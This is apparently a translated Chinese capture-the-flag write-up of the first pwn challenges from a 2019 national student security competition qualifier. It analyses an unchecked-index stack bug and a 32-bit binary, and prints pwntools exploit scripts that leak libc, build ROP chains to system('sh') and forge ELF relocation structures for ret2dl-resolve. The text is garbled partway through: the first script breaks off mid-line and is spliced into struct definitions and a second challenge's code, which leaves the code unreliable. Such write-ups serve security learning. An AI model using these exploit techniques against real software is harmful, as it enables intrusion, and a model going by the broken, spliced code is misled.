# 2019全国大学生信息安全竞赛初赛pwn前四题writeup
##### 译文声明
本文是翻译文章
译文仅供参考，具体内容表达以及含义原文为准。
## 前言：
这次比赛很尴尬，我本来以为自己报上了名，但是结果没报上。。。只能让同学给我发题目然后自己做，没法拿flag，一共六题，只做出来四题，两题栈，两题堆，最后两题做出来的队伍个数都只有16个，显然不是我这小破邮大一菜狗可以做出来的
Or2。
所有的二进制文件都在这里：[题目的二进制文件](https://github.com/xiaoxiaorenwu/mypwn/tree/master/2019_%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B%E5%88%9D%E8%B5%9B)
## 栈部分：
###  0x1 第一天_your_pwn:
**0x11功能分析和漏洞寻找：**
首先gdb看一下题目基本信息，是64位的程序，PIE开启，NX开启，relro没开全。
放进ida看一下，在main函数里只是一些准备工作没有漏洞存在，我们进入vuln函数进一步分析：
在vuln中我们发现了程序进行了41次循环，每一次输入一个下标index，以局部变量v4为基准泄露一个字节的内容，然后再改为新的数据，
**漏洞点在于index没有进行大小检查，可以任意大，超出v4数组的范围到达main返回地址处，**
这既实现了leak又实现了change，而且有41次机会，现在思路就很明了了！！
**0x12 漏洞利用：**
第一步还是leak出libc，根据经验我们知道在main函数返回地址附近一般会有__libc_start_main+240出现，我们可以泄露其然后进而泄露libc，这里的libc需要我们自己查找确定，我用的是wiki上的一个工具：[LibcSearcher](https://github.com/lieanu/LibcSearcher)，除了libc之外，我们还应泄露一下程序的基址，因为程序开了PIE，所以我们最后改main函数返回地址的时候要构造p64(pop_rdi_addr)+p64(sh_addr)+p64(system_addr)这个payload的时候pop_rdi_addr这个gadget需要程序基址。
main函数的rbp附近的stack分部如下图：我们可以利用画红圈的两个地方来leak出libc和基址。
第二步就是将main的返回地址改为payload=p64(pop_rdi_addr)+p64(sh_addr)+p64(system_addr)。需要注意的是sh_addr和system可能因为libc的不同而产生一些小变化，保险起见还是直接调试看偏移最好，不要直接在libc中搜索。
**0x13 exp如下：**
    #coding:utf-8
    from pwn import *
    from LibcSearcher import *
    context(os='linux',arch='amd64')
    #context.log_level = 'debug'
    p = process('./pwn')
    P = ELF('./pwn')
    p.recvuntil('name:')
    p.send('x12x12x12x12x12x12x12x12')
    ret_addr = [0 for i in range(6)]
    #----------------------------------------leak __libc_start_main_addr-------------------------------    for i in range(6):
        p.recvuntil('input indexn')
        p.sendline(str(624+8+i))  #具体数字自己调试，之后同，只要一块对了，然后之后算偏移即可。
        p.recvuntil('value(hex) ')
        addr = p.recv(8)
        if(addr[0]=='f'):
            addr = int(addr[6:],16)
        else:
            addr = int(addr[0:2],16)
        log.success('one_addr = '+hex(addr))
        p.recvuntil('new valuen')
        p.sendline(str(addr))
        ret_addr[i] = addr
    __libc_ret = ''
    for i in range(6):
        if(len(str(hex(ret_addr[5-i])))  
typedef struct {
        Elf32_Addr r_offset;    // 即got表的条目
    Elf32_Word r_info;      // 很重要，为重点伪造对象。
} Elf32_Rel;  
 _#_ define ELF32_R_SYM(info) ((info)>>8)  
 _#_ define ELF32_R_TYPE(info) ((unsigned char)(info))  
 _#_ define ELF32_R_INFO(sym, type) (((sym)=2.2  
Elf32_Section st_shndx; // Section index  
} Elf32_Sym;
  3. .dynstr节（动态链接的字符串）中储存了函数名。
//节的地址可以用readelf -S 来看。
  1. .延迟绑定。用下图可以直观的看到。
我们需要清楚GOT[0],GOT[1],GOT[2]和PLT[0]中的内容。
我们需要做的就是在使调用函数的整个过程被我们所控制，首先劫持栈：
payload+= p32(pop_rbp) + p32(mystack) + p32(leave_ret)
然后需要在栈上布置这种结构：  
payload = p32(mystack)  
payload+= p32(plt_0_addr)  
payload+= p32(fake_index)  
payload+= p32(ret_addr)  
payload+= p32(arguments)  
payload+= fake_rel  
payload+= fake_sym  
payload = payload.ljust(0x80,’x00’)  
payload+= fake_str
之后我们要做的事分三步：  
1.伪造fake_index来使程序跳入我们自己的fake_rel结构体  
2.构造fake_rel的r_info来使程序跳到我们自己的fake_sym结构体 (这里需要我们自己来构造字节对齐。)  
3.构造fake_sym结构体的st_name来使程序跳到我们自己的fake_str字符串。  
其中fake_index，fake_rel，fake_sym，fake_str的地址都需要我们自己能够精确地控制。（栈注意迁移即可。）
**0x23 exp如下：**
    #coding:utf-8
    from pwn import *
    context(os='linux',arch='i386')
    #context.log_level = 'debug'
    p = process('./pwn')
    P = ELF('./pwn')
    lr = 0x08048448
    bss = 0x0804aa00
    pppr_addr = 0x080485d9
    pop_ebp = 0x080485db
    payload = (0x28+4) * 'a'
    payload+= p32(P.plt['read'])
    payload+= p32(pppr_addr)
    payload+= p32(0)